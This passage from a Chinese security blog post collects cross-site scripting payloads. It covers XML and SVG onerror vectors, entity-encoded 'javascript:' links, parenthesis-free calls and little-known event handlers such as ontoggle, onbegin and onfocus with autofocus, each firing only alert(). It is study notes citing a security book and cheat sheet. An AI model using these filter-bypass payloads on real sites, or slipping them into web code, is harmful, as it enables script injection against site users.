<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">        hello</span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="svg文件上传"><a href="#svg文件上传" class="headerlink" title="svg文件上传"></a>svg文件上传</h4><p>网站允许svg类型的文件上传，可以造成xss:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">'x'</span> <span class="attr">xmlns</span>=<span class="string">'http://www.w3.org/2000/svg'</span> <span class="attr">xmlns:xlink</span>=<span class="string">'http://www.w3.org/1999/xlink'</span> <span class="attr">width</span>=<span class="string">'100'</span> <span class="attr">height</span>=<span class="string">'100'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">href</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="HTML实体"><a href="#HTML实体" class="headerlink" title="HTML实体"></a>HTML实体</h4><p><strong>10进制实体</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--'j'.codePointAt(0)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#106;</span>avascript:alert(1337)"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106avascript:alert(1337)"</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#00000000106avascript:alert(1337)"</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>16进制实体</strong></p>
<p>16进制的例子中，第二个会失效。第二个中，a也是16进制范围内，会造成解码异常。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--'j'.codePointAt(0).toString(16)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#x6a;</span>avascript:alert(1337)"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6aavascript:alert(1337)"</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#000000000x6a;avascript:alert(1337)"</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"jav&amp;#x61script:alert(1337)"</span>&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"java&amp;#xascript:alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>HTML5实体</strong></p>
<p>html5引入了一些新的实体，可以造成xss:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>alert(1337)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>无括号xss:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>alert<span class="symbol">&amp;lpar;</span>1337<span class="symbol">&amp;rpar;</span>"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"jav<span class="symbol">&amp;NewLine;</span>as<span class="symbol">&amp;Tab;</span>cript<span class="symbol">&amp;colon;</span>alert<span class="symbol">&amp;lpar;</span>1337<span class="symbol">&amp;rpar;</span>"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert<span class="symbol">&amp;grave;</span>1337<span class="symbol">&amp;grave;</span>"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert<span class="symbol">&amp;DiacriticalGrave;</span>1338<span class="symbol">&amp;DiacriticalGrave;</span>"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其他实体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lpar;&amp;rpar;&amp;bsol;&amp;lsqb;&amp;rsqb;&amp;lcub;&amp;rcub;</span><br></pre></td></tr></table></figure>
<p><strong>HTML事件</strong></p>
<p><code>onafterscriptexecute</code>事件仅限Firefox，他会在脚本执行后触发，并且可以使用任何标记：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xss</span> <span class="attr">onafterscriptexecute</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>ontoggle</code>事件，如果打开<code>details</code>元素，则会触发执行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert(1)</span> <span class="attr">open</span>&gt;</span>test<span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onunhandledrejection</code>事件，这是一个相对模糊的事件，仅适用于Firefox。它需要一个没有捕获条款的承诺。要利用此漏洞攻击网站，您需要一个具有未经处理的拒绝的现有脚本。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunhandledrejection</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">fetch(<span class="string">'//xyz'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onbegin</code>会在svg动画开始前加载：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onpopstate</code>是一个事件处理函数，它用于处理浏览器的历史记录状态改变事件，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpopstate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>location.hash=1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onfocus</code>属性可以通过<code>#</code>触发，或者自动触发，可以是任何标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--http://target.com#x--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其他：</p>
<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy (portswigger.net)</a></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><p>《JavaScript For Hackers》- Gareth Heyes</p>
</li>
<li><p><a href="http://whip1ash.cn/2018/07/01/HTML-Javscript-self-decode/" target="_blank" rel="noopener">http://whip1ash.cn/2018/07/01/HTML-Javscript-self-decode/</a></p>
</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Sys71m</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://www.sys71m.top/2023/06/10/JavaScript-For-Hackers随笔/">https://www.sys71m.top/2023/06/10/JavaScript-For-Hackers随笔/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/Fuzz/">Fuzz</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2022/12/25/2022小总结/"><span>2022小总结</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'https://www.sys71m.top/2023/06/10/JavaScript-For-Hackers随笔/';
  this.page.identifier = '2023/06/10/JavaScript-For-Hackers随笔/';
  this.page.title = 'JavaScript For Hackers随笔';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'sys71m' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://sys71m.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2023 By Sys71m</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>